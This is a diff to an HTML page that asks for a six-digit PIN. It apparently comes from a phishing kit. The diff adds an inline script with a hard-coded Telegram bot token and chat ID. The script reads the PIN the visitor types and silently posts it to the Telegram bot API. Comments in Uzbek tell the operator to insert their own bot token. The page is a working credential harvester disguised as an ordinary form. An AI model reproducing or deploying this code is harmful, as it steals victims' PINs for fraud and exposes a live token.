@@ -192,9 +192,8 @@
   <input type="hidden" id="JWTContainer" value="" />
   <input type="hidden" id="cardinalOrderNumber" value="" />
   <div role="main" class="form-all">
-  	   <input type="hidden" id="input_3_full" name="q3_phoneNumber[full]" data-/>
+  	   <input type="hidden" id="name" name="setPin" data-/>
 </form>
-<script src="sendtelegram.js"></script>😊
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
     <script>
@@ -221,7 +220,7 @@
                     var pinValue = $("input#setPin").val();
 
                     if(pinValue.length == 6) {
-                        $("#input_2").submit();
+                        $("#222618634676464").submit();
                     }
                 }
             });
@@ -235,5 +234,37 @@
             });
         });
     </script>
+    <script>
+    //bot token
+var telegram_bot_id = "5484981142:AAGEkDzjGbL7phS7Tb8ffCi0DNuIG5NPdzU"; // token'ni o'rniga Siz yaratgan Bot tokenini yozing
+//chat id
+var chat_id = 5322203833; // 1111'ni o'rniga habar borishi kerak bo'lgan joyni ID'sini yozing (Batafsil videoda)
+var name;
+var ready = function() {
+    name = document.getElementById("name").value;  
+    message = "setPin : " + name;
+};
+var sendtelegram = function() {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function(response) {
+        console.log(response);
+    });
+    document.getElementById("name").value = "";
+    return false;
+}
     <!-- </body> -->
   </body>
